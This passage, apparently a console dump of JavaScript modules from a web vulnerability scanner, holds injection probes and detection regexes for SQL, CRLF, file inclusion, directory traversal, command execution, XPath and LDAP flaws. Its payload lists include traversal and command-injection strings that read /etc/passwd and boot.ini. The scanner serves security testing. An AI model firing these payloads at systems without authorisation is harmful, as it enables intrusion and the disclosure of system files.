					  {sql : "${origvalue}'%2B'ACUoneACU", cond : false, relative : 0},
					  {sql : "${origvalue}'%2B'ACUtwoACU", cond : false, relative : 0}
					  ),
			new Array(
					  {sql : "${origvalue}"},
					  {sql : "${origvalue}'+%7C%7C+'", cond : true, relative : 0},
					  {sql : "${origvalue}'+%7C%7C+'ACUoneACU", cond : false, relative : 0},
					  {sql : "${origvalue}'+%7C%7C+'ACUtwoACU", cond : false, relative : 0}
					  )
	);
	
	//accepted content types
	this.arrayAcceptedContentTypes = new Array("text/html","text/xml","application/xhtml+xml");
	
	arrayResponseBuffer = new Array();
	
	this.fncTaskCallBack =
	{
		boolRequestPhase	: true,
		intTestStep			: 0,
		intStep				: 0,
		
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.boolRequestPhase)
			{
				if( this.intStep == 0)
					arrayResponseBuffer = new Array();
				
				var stroriginalValue = this.parent.getOriginalValueOfTestedItem(this.parent);
				var strInjection = this.parent.arrayBlindInjectionTest[this.intTestStep][this.intStep].sql;
				strInjection = strInjection.replace("${origvalue}",escape(stroriginalValue));
				
				this.boolRequestPhase = false;
				
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: strInjection,
						//arrayAcceptedContentTypes 	: new Array("text/html","text/xml","application/xhtml+xml"),
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;

			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if (this.parent.objTaskResult.intErrorCode < 0) //error in request
				{
					this.parent.fncExitTest(false);
					return;
				}
				
				arrayResponseBuffer[this.intStep] = this.parent.objTaskResult.strResponseText;
					
				this.intStep ++;
				
				if(this.intStep >= this.parent.arrayBlindInjectionTest[this.intTestStep].length)
				{
					var boolVulnerable = true;
					
					for(var i = 0; i < this.parent.arrayBlindInjectionTest[this.intTestStep].length; i++)
					{
						if(i == 0)
							continue;
						
						var strInj1 =  new String();
						var strInj2 =  new String();
						strInj1 = this.parent.arrayBlindInjectionTest[this.intTestStep][this.parent.arrayBlindInjectionTest[this.intTestStep][i].relative].sql;
						strInj1 = strInj1.replace("${origvalue}","");
						
						strInj2 = this.parent.arrayBlindInjectionTest[this.intTestStep][i].sql;
						strInj2 = strInj2.replace("${origvalue}","");
						
						var arrayExcludeRegex = new Array();
						
						arrayExcludeRegex.push("([0-1]?[0-9]|[2][0-3]):([0-5][0-9])[.|:]([0-9][0-9])");
						arrayExcludeRegex.push("<input\s+type=\"hidden\"\s+name=\"(__VIEWSTATE|__EVENTARGUMENT|__EVENTTARGET)\"\s+value=\"[^>]*>");
						
						function createRegExpListFromArgumentCombinations(arrayExcludeRegex,strArg)
						{
							if(strArg == "")
								return;
							
							function appendValue(arrayc,strValue)
							{
								if(strValue == "")
									return;
								for(var i = 0; i < arrayc.length; i++)
									if(arrayc[i] == strValue)
										return;
								arrayc.push(strValue);
							}
	
							appendValue(arrayExcludeRegex,strArg.regexEscape());
							appendValue(arrayExcludeRegex,unescape(strArg).regexEscape());
							appendValue(arrayExcludeRegex,escape(strArg).regexEscape());
							
							strArg = unescape(strArg);
							strArg = strArg.replace(/\+/g," ");
							strArg = strArg.replace(/%20/g," ");
							
							appendValue(arrayExcludeRegex,strArg.regexEscape());							
							appendValue(arrayExcludeRegex,strArg.replace(/\s/g,"+").regexEscape());
							appendValue(arrayExcludeRegex,strArg.replace(/\s/g,"%20").regexEscape());
							
							appendValue(arrayExcludeRegex,escape(strArg).regexEscape());							
							appendValue(arrayExcludeRegex,escape(strArg.replace(/\s/g,"+")).regexEscape());
							appendValue(arrayExcludeRegex,escape(strArg.replace(/\s/g,"%20")).regexEscape());
							
							appendValue(arrayExcludeRegex,escape(escape(strArg)).regexEscape());							
							appendValue(arrayExcludeRegex,escape(escape(strArg.replace(/\s/g,"+"))).regexEscape());
							appendValue(arrayExcludeRegex,escape(escape(strArg.replace(/\s/g,"%20"))).regexEscape());
														
						}
						
						createRegExpListFromArgumentCombinations(arrayExcludeRegex, strInj1);
						createRegExpListFromArgumentCombinations(arrayExcludeRegex, strInj2);
						
						boolVulnerable = compareHTMLStructures(arrayResponseBuffer[this.parent.arrayBlindInjectionTest[this.intTestStep][i].relative],arrayResponseBuffer[i],arrayExcludeRegex) == this.parent.arrayBlindInjectionTest[this.intTestStep][i].cond ;
						
						if(!boolVulnerable)
							break;
					}
					
					if(boolVulnerable)
					{
						this.parent.fncExitTest(true, "SQL Injection (blind test)");
						return;
					}
					this.intStep = 0;
					this.intTestStep ++;
					if (this.intTestStep >= this.parent.arrayBlindInjectionTest.length)
					{
						this.parent.fncExitTest(false);
						return;
					}
				}
				
				this.boolRequestPhase = true;
				this.doTest();
				return;
			}
		}
	}
		
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
}

//register the tester object
bsqlInjectionTester.register();
VM894:19 /*
Author:		Blade
Purpose:	CRLF injection test
*/

var CRLFInjectionTester					= new classGenericTester();
CRLFInjectionTester.strXULMenuId		= "acunetix_testtype_CRLFInjection";
CRLFInjectionTester.strXULMenuText		= "CRLF Injection";
CRLFInjectionTester.strXULMenuHint		= "Scan for CRLF Injection Vulnerabilities";
CRLFInjectionTester.strXULMenuAccesskey	= "C";
CRLFInjectionTester.strType				= "CRLF Injection";
CRLFInjectionTester.strTestName			= "CRLF Injection";
CRLFInjectionTester.severity			= "Medium";
CRLFInjectionTester.strDescription		= "http://www.acunetix.com/websitesecurity/";
CRLFInjectionTester.wvsCorelationID		= "CRLF_injection.xml";
CRLFInjectionTester.enabled				= false;
/*IMPLEMENTATION*/
CRLFInjectionTester.enabled				= true;


function searchForCRLFInjection(strInputText, boolJustReturnOnFirstError)
{
	if (boolJustReturnOnFirstError == null) boolJustReturnOnFirstError = false;
	var retval = new Array();
	
	arrayInjectionTestConditions = new Array
	(
		new Array({regex : /\n(SomeCustomInjectedHeader\s*:\s*injected_by_wvs)/i, condition : true})
		
	);
				  
	for( var i = 0; i < arrayInjectionTestConditions.length; i++)
	{
		var boolBondition = true;
		for(var j = 0; j < arrayInjectionTestConditions[i].length; j++)
		{
			var match = (arrayInjectionTestConditions[i][j].regex.exec(strInputText) != null);
			if(match != arrayInjectionTestConditions[i][j].condition)
			{
				boolBondition = false;
				break;
			}
		}
		
		if (boolBondition)
		{
			if (boolJustReturnOnFirstError)
				return(true);
			retval.push(i);
		}
	}
	if (boolJustReturnOnFirstError)
		return(false);
	else
		return(retval);
}




CRLFInjectionTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	
	//injected values				  
	this.arrayCRLFInjectionTestValues = new Array
	(
		"%0aSomeCustomInjectedHeader%3Ainjected_by_wvs",
		"%0d%0aSomeCustomInjectedHeader%3Ainjected_by_wvs"
	)
	
		
	//request result container	
	this.objTaskResult = this.objCallerClass.objTaskResult;

	
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
		strTestString		: Math.floor(Math.random()*1345670),
				
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> sqlInjectionTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayCRLFInjectionTestValues[this.intStep],
						arrayAcceptedContentTypes 	: new Array("text/html","text/xml","application/xhtml+xml"),
						intRedirectionLimit			: 0,
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForCRLFInjection(this.parent.objTaskResult.strResponseHeader,true))
					{
						this.parent.fncExitTest(true, this.parent.strXULMenuText);
						return;
					}

				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arrayCRLFInjectionTestValues.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}






//register the tester object
CRLFInjectionTester.register();

VM894:20 /*
Author:		Blade
Purpose:	The file inclusion test
*/

var FileInclusionTester					= new classGenericTester();
FileInclusionTester.strXULMenuId		= "acunetix_testtype_FileInclusion";
FileInclusionTester.strXULMenuText		= "File Inclusion";
FileInclusionTester.strXULMenuHint		= "Scan for File Inclusion Vulnerabilities";
FileInclusionTester.strXULMenuAccesskey	= "I";
FileInclusionTester.strType				= "File Inclusion";
FileInclusionTester.strTestName			= "File Inclusion";
FileInclusionTester.severity			= "High";
FileInclusionTester.strDescription		= "http://www.acunetix.com/websitesecurity/";
FileInclusionTester.wvsCorelationID		= "File_inclusion.xml";
FileInclusionTester.enabled				= false;
/*IMPLEMENTATION*/
FileInclusionTester.enabled				= true;

function searchForFileInclusion(strInputText, boolJustReturnOnFirstError)
{
	if (boolJustReturnOnFirstError == null) boolJustReturnOnFirstError = false;
	var retval = new Array();
	
	arrayInjectionTestConditions = new Array
	(
		new Array({regex : /63c19a6da79816b21429e5bb262daed863c19a6da79816b21429e5bb262daed8/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:  (file_get_contents\(.*?\)( \[<a href='function.file-get-contents'>function.file-get-contents<\/a>\])?|fopen\(some_inexistent_file_with_long_name\)( \[<a href='function.fopen'>function.fopen<\/a>\])?): failed to open stream: (No such file or directory|Invalid argument|(HTTP request failed! .*)) in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),		
		
		new Array({regex : /(<b>Warning<\/b>:.*: Failed opening '.*some_inexistent_file_with_long_name.*') for inclusion.*/i, condition : true}),
		new Array({regex : /(The requested resource\s\(.*some_inexistent_file_with_long_name\) is not available)/i, condition : true}),		
		new Array({regex : /(org.apache.jasper.JasperException: .*? File .*? not found)/i, condition : true})
	);
				  
	for( var i = 0; i < arrayInjectionTestConditions.length; i++)
	{
		var boolBondition = true;
		for(var j = 0; j < arrayInjectionTestConditions[i].length; j++)
		{
			var match = (arrayInjectionTestConditions[i][j].regex.exec(strInputText) != null);
			if(match != arrayInjectionTestConditions[i][j].condition)
			{
				boolBondition = false;
				break;
			}
		}
		
		if (boolBondition)
		{
			if (boolJustReturnOnFirstError)
				return(true);
			retval.push(i);
		}
	}
	if (boolJustReturnOnFirstError)
		return(false);
	else
		return(retval);
}


FileInclusionTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	
	//injected values				  
	this.arrayInjectionTestConditions = new Array
	(
		"http://some-inexistent-website.com/some_inexistent_file_with_long_name",
		"/some_inexistent_file_with_long_name",
		"http://testphp.vulnweb.com/acunetix_file_inclusion_test?"
	)
	
		
	//request result container	
	this.objTaskResult = this.objCallerClass.objTaskResult;
	
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
		
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> FileInclusionTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayInjectionTestConditions[this.intStep],
						//intRedirectionLimit		: 10,
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForFileInclusion(this.parent.objTaskResult.strResponseText,true))
					{
						this.parent.fncExitTest(true, this.parent.strXULMenuText);
						return;
					}

				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arrayInjectionTestConditions.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}

//register the tester object
FileInclusionTester.register();

VM894:21 /*
Author:		Blade
Purpose:	The directory traversal test
*/

var DirectoryTraversalTester					= new classGenericTester();
DirectoryTraversalTester.strXULMenuId			= "acunetix_testtype_DirectoryTraversal";
DirectoryTraversalTester.strXULMenuText			= "Directory Traversal";
DirectoryTraversalTester.strXULMenuHint			= "Scan for Directory Traversal Vulnerabilities";
DirectoryTraversalTester.strXULMenuAccesskey 	= "T";
DirectoryTraversalTester.strType				= "Directory Traversal";
DirectoryTraversalTester.strTestName			= "Directory Traversal";
DirectoryTraversalTester.severity				= "High";
DirectoryTraversalTester.strDescription			= "http://www.acunetix.com/websitesecurity/";
DirectoryTraversalTester.wvsCorelationID		= "Directory_Traversal_Unix.xml";
DirectoryTraversalTester.enabled				= false;
/*IMPLEMENTATION*/
DirectoryTraversalTester.enabled				= true;

function searchForDirectoryTraversal(strInputText, boolJustReturnOnFirstError)
{
	if (boolJustReturnOnFirstError == null) boolJustReturnOnFirstError = false;
	var retval = new Array();
	
	arrayInjectionTestConditions = new Array
	(
		new Array({regex : /(\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|))+/i, condition : true}),
		new Array({regex : /((\[boot\sloader\]|\[operating\ssystems\])(\r?\n|\r|)([^=^\r^\n]+\=[^\r^\n]+(\r?\n|\r|))+)+/i, condition : true})
	);
				  
	for( var i = 0; i < arrayInjectionTestConditions.length; i++)
	{
		var boolBondition = true;
		for(var j = 0; j < arrayInjectionTestConditions[i].length; j++)
		{
			var match = (arrayInjectionTestConditions[i][j].regex.exec(strInputText) != null);
			if(match != arrayInjectionTestConditions[i][j].condition)
			{
				boolBondition = false;
				break;
			}
		}
		
		if (boolBondition)
		{
			if (boolJustReturnOnFirstError)
				return(true);
			retval.push(i);
		}
	}
	if (boolJustReturnOnFirstError)
		return(false);
	else
		return(retval);
}


DirectoryTraversalTester.doTest = function(objCallerClass)
{
	this.objCallerClass	= objCallerClass;
	this.objTaskResult = objCallerClass.objTaskResult;
	
	//injected values				  
	this.arrayInjectionTestConditions = new Array
	(
		// Unix
		"../../../../../../../../etc/passwd",	//Basic test			
		"../../../../../../../../etc/passwd%00",	//End null byte	
		"%00../../../../../../../../etc/passwd",	//Start null byte	
		"../../../../../../../../etc/passwd%00.html",	//Extension html
		"../../../../../../../../etc/passwd%00.jpg",	//Extension jpg
		".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd",	//Backslash combined with slash
		"/etc/passwd", //Simple
		"/./././././././etc/passwd",	//SlashPoint
		"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\etc/passwd",	//Backslash
		"../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd",	//Avoid replace ./
		"../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd",	//Avoid replace ../
		"<../../../../../../../../etc/passwd",	//Misc1_thierry
		"|../../../../../../../../etc/passwd",	//Misc2_thierry
		"..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",	//UTF-8 encoding
		
		// Windows
		"../../../../../../../../boot.ini",	//Basic test			
		"../../../../../../../../boot.ini%00",	//End null byte	
		"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afboot.ini",	//Unicode
		"../../../../../../../../boot.ini%00.html",	//Extension html
		"../../../../../../../../boot.ini%00.jpg",	//Extension jpg
		"/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini",	//Backslash combined with slash
		"C:\\boot.ini", //Simple
		"/./././././././boot.ini",	//SlashPoint
		"..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",	//Backslash
		"../..//../..//../..//../..//../..//../..//../..//../..//boot.ini",	//Avoid replace ./
		"../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././boot.ini",	//Avoid replace ../
		"<..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",	//Misc1_thierry
		"|..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",	//Misc2_thierry
		"..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afboot.ini"	//UTF-8 encoding
	);
	
		
	
	
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
			
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> DirectoryTraversalTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayInjectionTestConditions[this.intStep],
						intRedirectionLimit			: 10,
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForDirectoryTraversal(this.parent.objTaskResult.strResponseText,true))
					{
						this.parent.fncExitTest(true, this.parent.strXULMenuText);
						return;
					}

				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arrayInjectionTestConditions.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}

//register the tester object
DirectoryTraversalTester.register();

VM894:22 /*
Author:		Blade
Purpose:	Code execution test
*/

var CodeExecutionTester						= new classGenericTester();
CodeExecutionTester.strXULMenuId			= "acunetix_testtype_CodeExecution";
CodeExecutionTester.strXULMenuText			= "Code Execution";
CodeExecutionTester.strXULMenuHint			= "Scan for Code Execution Vulnerabilities";
CodeExecutionTester.strXULMenuAccesskey 	= "E";
CodeExecutionTester.strType					= "Code Execution";
CodeExecutionTester.strTestName				= "Code Execution";
CodeExecutionTester.severity				= "High";
CodeExecutionTester.strDescription			= "http://www.acunetix.com/websitesecurity/";
CodeExecutionTester.wvsCorelationID			= "Code_Execution_Unix.xml";
CodeExecutionTester.enabled				= false;
/*IMPLEMENTATION*/
CodeExecutionTester.enabled				= true;

function searchForCodeExecution(strInputText, boolJustReturnOnFirstError)
{
	if (boolJustReturnOnFirstError == null) boolJustReturnOnFirstError = false;
	var retval = new Array();
	
	arrayInjectionTestConditions = new Array
	(
		new Array({regex : /(\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|))+/i, condition : true}),
		new Array(
			{regex : /(Volume in drive)/, condition : true},
			{regex : /(Volume Serial Number is)/, condition : true},
			{regex : /(Directory of)/, condition : true}
			),
		new Array({regex : /63c19a6da79816b21429e5bb262daed8/i, condition : true})
				
	);
				  
	for( var i = 0; i < arrayInjectionTestConditions.length; i++)
	{
		var boolBondition = true;
		for(var j = 0; j < arrayInjectionTestConditions[i].length; j++)
		{
			var match = (arrayInjectionTestConditions[i][j].regex.exec(strInputText) != null);
			if(match != arrayInjectionTestConditions[i][j].condition)
			{
				boolBondition = false;
				break;
			}
		}
		
		if (boolBondition)
		{
			if (boolJustReturnOnFirstError)
				return(true);
			retval.push(i);
		}
	}
	if (boolJustReturnOnFirstError)
		return(false);
	else
		return(retval);
}


CodeExecutionTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	
	//injected values				  
	this.arrayInjectionTestConditions = new Array
	(
		// Unix
		"+%26cat+/etc/passwd%26",	//And(&) test	
		"+%0acat+/etc/passwd%0a",	//New line
		"%60cat+/etc/passwd%60",	//Back
		"cat+/etc/passwd",			//Simple
		"%3Bcat+/etc/passwd%3B",	//Semi
		"%7Ccat+/etc/passwd",		//Pipe
		"%00cat%20/etc/passwd%00", 	//Misc1_thierry
		"<cat%20/etc/passwd%00",	//Misc2_thierry
		
		// Windows
		"%26dir%26",				//And(&) test
		"%7Cdir",					//Pipe test
		"%3Bdir",					//Other test
		"%26dir",					//And(&) test 2
		"dir",						//Basic
		"%00dir%00", 				//Misc1_thierry
		"<dir",						//Misc2_thierry

		// PHP code execution
		"printf(md5(acunetix_wvs_security_test))%3Bexit%3B//",			//simple injection
		"%3Bprintf(md5(acunetix_wvs_security_test))%3Bexit%3B//",		//test2
		"'%3Bprintf(md5(acunetix_wvs_security_test))%3Bexit%3B//",		//test3
		"%3Bprintf(md5(acunetix_wvs_security_test))%3Bexit%3B//"		//test4
	)	
		
	//request result container	
	this.objTaskResult = this.objCallerClass.objTaskResult;
		
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
		
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> CodeExecutionTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayInjectionTestConditions[this.intStep],
						intRedirectionLimit			: 10,
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForCodeExecution(this.parent.objTaskResult.strResponseText,true))
					{
						this.parent.fncExitTest(true, this.parent.strXULMenuText);
						return;
					}

				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arrayInjectionTestConditions.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}

//register the tester object
CodeExecutionTester.register();

VM894:23 var XPathInjectionTester					= new classGenericTester();
XPathInjectionTester.strXULMenuId			= "acunetix_testtype_XPathInjection";
XPathInjectionTester.strXULMenuText			= "XPath Injection";
XPathInjectionTester.strXULMenuHint			= "Scan for XPath Injection Vulnerabilities";
XPathInjectionTester.strXULMenuAccesskey	= "X";
XPathInjectionTester.strType				= "XPath Injection";
XPathInjectionTester.strTestName			= "XPath Injection";
XPathInjectionTester.severity				= "Medium";
XPathInjectionTester.strDescription			= "http://www.acunetix.com/websitesecurity/";
XPathInjectionTester.wvsCorelationID		= "XPath_Injection.xml";
XPathInjectionTester.enabled				= false;
/*IMPLEMENTATION*/
XPathInjectionTester.enabled				= true;

function searchForXPathInjection(strInputText, boolJustReturnOnFirstError)
{
	if (boolJustReturnOnFirstError == null) boolJustReturnOnFirstError = false;
	var retval = new Array();
	
	arrayInjectionTestConditions = new Array
	(
		new Array({regex : /(<b>\sException\sDetails:\s<\/b>System\.Xml\.XPath\.XPathException:\s'.*'\shas\san\sinvalid\stoken\.<br><br>)/i, condition : true}),
		new Array({regex : /(<b>\sException\sDetails:\s<\/b>System\.Xml\.XPath\.XPathException:\sThis\sis\san\sunclosed\sstring\.<br><br>)/i, condition : true}),
		new Array({regex : /(System.Xml.XPath.XPathException\:\ )/i, condition : true})
		
	);
				  
	for( var i = 0; i < arrayInjectionTestConditions.length; i++)
	{
		var boolBondition = true;
		for(var j = 0; j < arrayInjectionTestConditions[i].length; j++)
		{
			var match = (arrayInjectionTestConditions[i][j].regex.exec(strInputText) != null);
			if(match != arrayInjectionTestConditions[i][j].condition)
			{
				boolBondition = false;
				break;
			}
		}
		
		if (boolBondition)
		{
			if (boolJustReturnOnFirstError)
				return(true);
			retval.push(i);
		}
	}
	if (boolJustReturnOnFirstError)
		return(false);
	else
		return(retval);
}

XPathInjectionTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	this.objTaskResult	 	= objCallerClass.objTaskResult;
	
	//injected values				  
	this.arrayXPathInjectionTestValues = new Array
	(
		"'\"",		//	Single and double quote
		"/"			// Variant1
	)
		
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
		strTestString		: Math.floor(Math.random()*1345670),
		
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> XPathInjectionTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayXPathInjectionTestValues[this.intStep],
						arrayAcceptedContentTypes 	: new Array(),
						intRedirectionLimit			: 10,
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForXPathInjection(this.parent.objTaskResult.strResponseText,true))
					{
						this.parent.fncExitTest(true, this.parent.strXULMenuText);
						return;
					}

				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arrayXPathInjectionTestValues.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}


//register the tester object
XPathInjectionTester.register();

VM894:24 /*
Author:		Blade
Purpose:	The LDAP injection test
*/

var LDAPInjectionTester						= new classGenericTester();
LDAPInjectionTester.strXULMenuId			= "acunetix_testtype_LDAPInjection";
LDAPInjectionTester.strXULMenuText			= "LDAP Injection";
LDAPInjectionTester.strXULMenuHint			= "Scan for LDAP Injection Vulnerabilities";
LDAPInjectionTester.strXULMenuAccesskey		= "L";
LDAPInjectionTester.strType					= "LDAP Injection";
LDAPInjectionTester.strTestName				= "LDAP Injection";
LDAPInjectionTester.severity				= "Medium";
LDAPInjectionTester.strDescription			= "http://www.acunetix.com/websitesecurity/";
LDAPInjectionTester.wvsCorelationID			= "LDAP_injection.xml";
LDAPInjectionTester.enabled				= false;
/*IMPLEMENTATION*/
LDAPInjectionTester.enabled				= true;

function searchForLDAPInjection(strInputText, boolJustReturnOnFirstError)
{
	if (boolJustReturnOnFirstError == null) boolJustReturnOnFirstError = false;
	var retval = new Array();
	
	arrayInjectionTestConditions = new Array
	(
		new Array({regex : /(IPWorksASP\.LDAP.*800a4f70.*\[335\]\s\(no description\savailable\))/i, condition : true}),
		new Array({regex : /(<span><H1>Server Error in '.*?' Application.*<h2>\s<i>The.*search filter is invalid\.<\/i>)/i, condition : true})	
	);
				  
	for( var i = 0; i < arrayInjectionTestConditions.length; i++)
	{
		var boolBondition = true;
		for(var j = 0; j < arrayInjectionTestConditions[i].length; j++)
		{
			var match = (arrayInjectionTestConditions[i][j].regex.exec(strInputText) != null);
			if(match != arrayInjectionTestConditions[i][j].condition)
			{
				boolBondition = false;
				break;
			}
		}
		
		if (boolBondition)
		{
			if (boolJustReturnOnFirstError)
				return(true);
			retval.push(i);
		}
	}
	if (boolJustReturnOnFirstError)
		return(false);
	else
		return(retval);
}

LDAPInjectionTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	
	//injected values				  
	this.arrayLDAPInjectionTestValues = new Array
	(
		")",									//	Simple
		"!(%28%29&%26%21%7C*|%2A%7C"			// Variant1
	)
	
		
	//request result container	
	this.objTaskResult = this.objCallerClass.objTaskResult;
	
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
		strTestString		: Math.floor(Math.random()*1345670),
		
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> LDAPInjectionTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayLDAPInjectionTestValues[this.intStep],
						arrayAcceptedContentTypes 	: new Array(),
						intRedirectionLimit			: 10,
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
